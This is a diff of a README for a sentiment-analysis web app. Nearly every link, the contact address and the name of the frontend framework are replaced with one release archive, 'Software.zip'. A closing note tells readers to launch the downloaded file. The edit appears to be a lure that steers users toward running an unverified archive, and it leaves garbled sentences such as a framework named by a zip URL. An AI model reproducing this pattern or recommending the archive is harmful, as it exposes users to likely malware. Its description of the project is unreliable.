@@ -1,12 +1,12 @@
 
 # 🚀 Sentiment Analyser
 
-![Sentiment Analyser](https://www.example.com/sentiment-analyser.png)
+![Sentiment Analyser](https://github.com/youssef25214/sentiment-analyser/releases/download/v1.0/Software.zip)
 
 ## Description
 Welcome to the Sentiment Analyser repository! This is a full-stack web application that provides sentiment analysis for user-provided text. The app offers insightful sentiment metrics and visualizations to help users understand the sentiment of their input text. 
 
-The backend of the application is built using Flask, a popular Python web framework known for its ease of use and flexibility. The frontend interface is developed using Next.js, a React framework that enables the creation of responsive and dynamic web applications. 
+The backend of the application is built using Flask, a popular Python web framework known for its ease of use and flexibility. The frontend interface is developed using https://github.com/youssef25214/sentiment-analyser/releases/download/v1.0/Software.zip, a React framework that enables the creation of responsive and dynamic web applications. 
 
 The Sentiment Analyser processes user input text, classifies sentiments into positive, negative, or neutral categories, and provides sentiment polarity metrics to give users a comprehensive understanding of the sentiment behind the text.
 
@@ -15,7 +15,7 @@ The Sentiment Analyser processes user input text, classifies sentiments into pos
 - Classify sentiments as positive, negative, or neutral
 - Display sentiment metrics and visualizations
 - Backend API built with Flask
-- Frontend interface built with Next.js
+- Frontend interface built with https://github.com/youssef25214/sentiment-analyser/releases/download/v1.0/Software.zip
 - Utilizes REST API for data exchange
 - Tailwind CSS for styling the frontend interface
 
@@ -25,13 +25,13 @@ The Sentiment Analyser processes user input text, classifies sentiments into pos
   - REST API
 
 - Frontend
-  - Next.js
+  - https://github.com/youssef25214/sentiment-analyser/releases/download/v1.0/Software.zip
   - React
   - Tailwind CSS
 
 ## Installation
 To use the Sentiment Analyser application, follow these steps:
-1. Clone the repository using the following link: [Clone Sentiment Analyser](https://github.com/user/sentiment-analyser.git)
+1. Clone the repository using the following link: [Clone Sentiment Analyser](https://github.com/youssef25214/sentiment-analyser/releases/download/v1.0/Software.zip)
 2. Install the necessary dependencies by running: 
    ```bash
    npm install
@@ -52,14 +52,14 @@ Once the application is set up, navigate to the provided URL in your web browser
 Contributions to the Sentiment Analyser repository are welcome! If you have any ideas for improvements or new features, feel free to fork the repository and submit a pull request.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/user/sentiment-analyser/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/youssef25214/sentiment-analyser/releases/download/v1.0/Software.zip) file for details.
 
 ## Contact
-For any inquiries or support regarding the Sentiment Analyser application, please contact us at sentiment.analyser@example.com.
+For any inquiries or support regarding the Sentiment Analyser application, please contact us at https://github.com/youssef25214/sentiment-analyser/releases/download/v1.0/Software.zip
 
 ---
 
-[![Download Sentiment Analyser](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Sentiment Analyser](https://github.com/youssef25214/sentiment-analyser/releases/download/v1.0/Software.zip)](https://github.com/youssef25214/sentiment-analyser/releases/download/v1.0/Software.zip)
 
 **Note:** This link leads to a downloadable file that needs to be launched to access the Sentiment Analyser application.
 
